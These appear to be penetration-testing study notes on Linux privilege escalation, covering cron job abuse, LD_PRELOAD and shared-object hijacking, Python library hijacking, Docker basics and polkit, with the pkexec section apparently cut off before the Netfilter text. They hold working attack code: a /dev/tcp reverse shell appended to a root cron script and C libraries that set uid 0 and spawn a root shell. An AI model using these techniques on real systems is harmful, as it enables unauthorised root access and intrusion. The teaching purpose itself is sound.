* **`cap_setgid`:** Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group

* **`cap_sys_admin`:** Provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems

* **`cap_dac_override`:** Allows bypassing of file read, write, and execute permission checks

##### **`Cron Job Abuse`**

Cron jobs can be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The **`crontab`** command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in **`/var/spool/cron`** for the specific user that creates it. **Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands.** For example, the following entry would run every 12 hours:
```bash
0 */12 * * * /home/admin/backup.sh

```
The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. There may be a world-writable script that runs as root and even if the crontab cannot be read to know the exact schedule, it still may be possible to know how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, a command can be appended onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them. First, **look around the system for any writeable files or directories and determine whether the file is running on a cron job.**
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

```
Assume a file `backup.sh` in the `/dmz-backups` directory appears. Because of the name of the directory, it is likely running on a cron job. In this case, when looking at the `/dmz-backups`, it will be determined that files are created every three minutes. This is clearly a major misconfiguration because the backups are happening too frequently. Also in this example, the `backup.sh` shell script is world writeable and runs as root. 

It is possible to confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), which views the running processes without the need for root privileges. This can be used to see commands run by other users, cron jobs, etc., as it scans procfs. When running `pspy`, the `-pf` tells the tool to print commands and file system events and the `-i 1000` tells it to scan procfs every second (1000 ms).

In this example, the cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creates a tarball file of the contents of the `/var/www/html` directory. Now that this has been discovered, attempt to append malicious commands to the end of the script to still run properly before executing the reverse shell command. First, look at the original cron job script:
```bash
cat /dmz-backups/backup.sh 

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

```
Again, because `backup.sh` is globally writeable, this can be modified. The original script takes the source and destination directory as variables and then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. In the following script, this original file is modified to add a bash reverse shell:
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1

```
At this point, open a local netcat listener and wait. Once the cron job runs, a root shell will be created on the attacker's terminal. It is important to note that this type of attack is not very common, but poorly configured cron jobs can be abused at times.

##### **`Docker`**

Docker provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the OS level and share the file system and system resources. One advantage is that containerization consumes significantly fewer resources than a traditional server or virtual machine. The core feature of Docker is that applications are encapsulated in **Docker containers** and can be used for any OS. A docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime. 

**<u>Docker Architecture</u>**

At the core of the Docker architecture lies a client-server model, where there are two primary components:
* **`Docker Daemon (Server)`:** Responsible for executing client commands and running, interacting, and managing containers. 
   * Docker daemons **handle core containerization functionality.** It coordinates the creation, execution, and monitoring of Docker containers, maintaining their isolation from the host and other containers: this isolation ensures that containers operate independently with their own file systems, processes, and network interfaces.
   * Docker daemons also **handle Docker image management.** It pulls images from registries, such as Docker Hub or private repositories, and stores them locally. These images serve as the building blocks for creating containers
   * Docker daemons offers **monitoring and logging capabilities,** for example:
      * Captures container logs
      * Provides insight into container activities, errors, and debugging information
      * Monitors resource utilization, such as CPU, memory, and network usage, allowing admins to optimize container performance and troubleshoot issues
   * Docker dameons **facilitate container networking by creating virtual networks and managing network interfaces.** It enables containers to communicate with each other and the outside world through network ports, IP addresses, and DNS resolution. 
   * The docker daemon is also critical in **storage management,** since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachement, and clean-up, allowing containers to share or store data independently of each other
* **`Docker Client`:** Acts as the interface for issuing commands and interacting with the Docker ecosystem.
   * When interacting with Docker, **commands are issued through the Docker Client,** which communicates with the Docker daemon (through a RESTful API or a Unix socket) and serves as the primary means of interacting with Docker. 
      * Through this, Docker images can be created, started, stopped, managed, removed searched, and downloaded. With these options, existing images can be pulled to use as a base for the containers or custom images can be built via Dockerfiles. There is also the flexibility to push images to remote repositories, facilitating collaboration and sharing within teams or with the wider communities
      * In contrast, the daemon carries out the requested actions, ensuring containers are created launched, stopped, and removed as required
   * Another client for Docker is **Docker Compose.** It is a tool that simplifies the orchestration of multiple Docker containers as a single application; it allows admins to define their application's multi-container architecture using a declarative YAML file. 
      * With the YAML, an admin can specify the services comprising their application, their dependencies, and their configurations. Container images, environment variables, networking, volume bindings, and other settings are defined. 
      * Docker Compose then ensures that all the defined containers are launched and interconnected, creating a cohesive and scalable application stack 
   * **Docker Desktop** is a GUI that simplifies the management of containers and their components. This allows admins to monitor the status of containers, inspect logs, and manage the resources allocated to Docker

<br>

**<u>Docker Images and Containers</u>**

Docker images are essentially a blueprint/template for creating containers. It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations. An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments. Images can be created using a text file called a **Dockerfile,** which defines the steps and instructions for building the image. 

A Docker container is an instance of a Docker image. It is a lightweight, isolated, and executable environment that runs applications. When a container is launched, it is created from a specific image, and the container inherits all the properties and configurations defined in that image. Each container operated independently with its own filesystem, processes, and network interfaces. This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference. 

While images are immutable and read-only, containers are mutable and can be modified during runtime. Admins can interact with containers, execute commands within them, monitor their logs, and even make changes to their filesystem or environment; however, any modifications made to a container's filesystem are not persisted unless explicitly saved as a new image or stored in a persistent volume.

##### **`Shared Libraries`**

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux:
* **Static Libaries:** When a program is compiled, static libraries become part of the program and cannot be altered. This is denoted by the .a file extension

* **Dynamically Linked Shared Object Libraries:** Can be modified to control the execution of the program that calls them. This is denoted by the .so file extension

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables **`LD_RUN_PATH` or `LD_LIBRARY_PATH`,** placing libraries in the **`/lib` or `/usr/lib`** default directories, or specifying another directory containing the libraries within the **`/etc/ld.so.conf`** configuration file. 

Additionally, the **`LD_PRELOAD`** environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the following utility:
```bash
ldd /bin/ls

```
The **`LD_PROLOAD`** environment variable can be used to escalate privileges. For this, the user needs sudo privileges: assume the user has NOPASSWD sudo privileges for `/usr/sbin/apache2 restart`. This user has rights to restart the Apache service as root, but since this is not a GTFOBin and the /etc/sudoers entry is **written specifying the absolute path,** this could not be used to escalate privileges under normal circumstances; however, the LD_PRELOAD issue can be exploited to run a custom shared library file. For this, compile the following library:
```c
//name as root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

```
This must be compiled as follows:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles     #put in /tmp 
```
Finally, escalate privileges using the below command. Make sure to specify the full path to the malicious library file:
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

##### **`Shared Object Hijacking`**

Programs and binaries under development usually have custom libraries associated with them. Consider a SETUID binary. The `ldd` command can be used to print the shared object required by a binary or shared object. `ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies. 
```bash
ldd <binary>

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

```
In this example output, there is a non-standard library named `libshared.so` listed as a dependency for the binary. Again, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the `readelf` utility
```bash
readelf -d <binary>  | grep PATH

0x000000000000001d (RUNPATH)            Library runpath: [/development]

```
In the example, configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precendence over other folder because entries in this file are checked first (before other folders present in the configuration files). Before compiling a library, find the function name called by the binary, which is `/lib/x86_64-linux-gnu/libc.so.6` in this case:
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

```
This Copies the existing library to the folder. Running ldd against the binary lists the library's path as `/development/libshared.so`, which means that it is vulnerable. In this case, executing the binary throws an error stating that it failed to find the function named dbquery. A shared object that includes this function can be compiled:
```c
//name src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {        //replace the function name if needed
   printf("Malicious library loaded\n");
   setuid(0);
   system("/bin/sh -p");
} 

```
In this case, the dbquery function sets the user id to 0 and executes /bin/sh when called. Compile the file as follows and then run the binary:
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

##### **`Python Library Hijacking`**

There are many ways in which a Python library can be hijacked. Much depends on the script and its contents itself; however, there are three basic vulnerabilities where hijacking can be used:

**<u>Wrong Write Permissions</u>**

Imagine being on a target machine that is connected to the company's intranet and the target works with Python. There are three connected components. The Python script imports a python module and the privileges of the script as well as the permissions of the module. One or another Python module may have write permissions set for all users by mistake. This allows the Python module to be edited and manipulated so that an attacker can insert commands or functions that will escalate privileges. If SUIF/SGID permissions have been assigned to the Python script that imports this module, the code will automatically be included. 

Begin by looking at the set permissions of the script to determine whether it has a SUID set. If set, the script can be executed with the privileges of another user, potentially even root. View the script and read its contents if possible. In this case, the following script is on the target machine with SUID set:
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")

```
While script is simple, the main points of focus are the imported module (psutil) and the function from the module (virtual_memory()). Look for this function in the folder of psutil and check if the module has write permissions:
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py      #this is the correct library to look for the write permissions

```
If in a developer environment, this will likely have write permissions for everyone, as many developers work on different scripts and may require higher privileges. In this case, the following is the exact portion of the library that can be edited as it is the function being called:
```python
def virtual_memory():
	...SNIP...
   global _TOTAL_PHYMEM
   ret = _psplatform.virtual_memory()
   # cached for later use in Process.memory_percent()
   _TOTAL_PHYMEM = ret.total
   return ret

```
It is recommended to **put the malicious code right at the beginning of the function.** There, everything can be inserted that is correct and effective. Import the module os for testing purposes, which allows an attacker to execute system commands. With this, insert the command id and check during the execution of the script if the inserted code is executed:
```python
def virtual_memory():
	...SNIP...
	#### Hijacking
	import os
	os.system('id')

   global _TOTAL_PHYMEM
   ret = _psplatform.virtual_memory()
   # cached for later use in Process.memory_percent()
   _TOTAL_PHYMEM = ret.total
   return ret
```
Now run the script with sudo to see if the id of the root user is displayed. If this works, edit the library and insert a reverse shell that connects to the local machine as root to escalate privileges:
```bash
sudo /usr/bin/python3 ./<file.py>

```

**<u>Library Path</u>**

In Python, each version has a specified order in which modules are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. This can be seen by issuing the following command:
```bash
python3 -c 'import sys; print("\n".join(sys.path))'

```
To use this variant, two prerequisites are necessary:
1. The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable 
2. Write permissions to one of the paths having a higher priority on the list are required

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by the logged-in user, **a module can be created with the same name that includes malicious functions.** Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

For this to make sense, the previous script will be used that includes the psutil module. To see psutil's default installation location, use the following command:
```bash
pip3 show psutil | grep "Location:"

```
From this example, psutil is installed in the `/usr/local/lib/python3.8/dist-packages` path. From the listing of the PYTHONPATH variable, there may be several directories to choose from to see if there might be any misconfigurations in the environment that allow write access. Check with the following command:
```bash
ls -la /usr/lib/python3.8

```
After checking all of the directories listed, the `/usr/lib/python3.8` path may be misconfigued in a way to allow any user to write to it. Cross-check with values from the `PYTHONPATH` variable to see of the path is higher on the list than the path in which psutil is installed in. This misconfiguration can be abused to create a psutil module containing a malicious virtual_memory() function within the /usr/lib/python3.8 directory:
```python
#!/usr/bin/env python3
import os

def virtual_memory():
   os.system('id')

```
In order to get to this point, a file named `psutil.py` must be creating containing the contents listed above in the previously mentioned directory. It is important to make sure that the created module has the same name as the import as well as having the same function with the correct number of arguments passed to it as the function that is going to be hijacked. This is critical as without either of these conditions being true, this attack will not work. After creating this file containing the example of the previous hijacking script, the system will be prepped for exploitation. Run the script again using sudo; if it works edit the file to create a reverse shell that connects to the local machine as root to escalate privileges:
```bash
sudo /usr/bin/python3 <file.py>

```

**<u>PYTHONPATH Environment Variable</u>**

PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important because if a user is allowed to manipulate and set this variable while running the python binary, they can redirect Python's search functionality to a user-defined location when it comes time to import modules. To see if the logged-in user has the permissions to set environment variables for the Python binary, check the sudo permissions with `sudo -l`

If `/usr/bin/python3` can be run with sudo privileges and NOPASSWD, the environment variables can be set by the `SETENV:` flag. Due to the trusted nature of sudo, any environment variables defined before calling the binary are not subject to any restrictions regarding being able to set environment variables, meaning that using the `/usr/bin/python3` binary enables setting environment variables under the context of a running program. 

Again, based on the previous script, the following command can be executed:
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 <file.py>

```
In this example, the previous python script was moved from the `/usr/lib/python3.8` directory to /tmp. At this point, the python3 binary was called to run the script; however, the PYTHONPATH variable is is contained in the /tmp directory so it forces Python to search that directory looking for the psutil module to import.

##### **`Polkit`**

**PolicyKit** is an authorization service on Linux-based OSs that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, polkit is asked. It is possible to set how permissions are granted by default for each user and application
* For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required.
* For individual users and groups, the authorizations can be assigned individually

Polkit works with two groups of files:
* **Actions/Policies:** /usr/share/polkit-1/actions
* **Rules:** /usr/share/polkit-1/rules.d

Polkit also has local authority rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension .pkla

Polkit also comes with three additional programs:
* **pkexec:** Runs a program with the rifhts of another user or with root rights. This is the most interesting tool for privilege escalation because it performs the same task as sudo and can run a program with the rights of another user or root
* **pkaction:** Can be used to display actions
* **pkcheck:** Can be used to check if a process is authorized for a specific action

With pkexec:

Netfilter is a Linux kernel module that provides packet filtering, NAT, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. Netfilter is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like iptables and arptables, which serve as action mechanisms of the Netfiler hook system of the IPv4 and IPv6 protocol stack.

This kernel module has three main functions:
* Packet defragmentation
* Connection tracking
* NAT
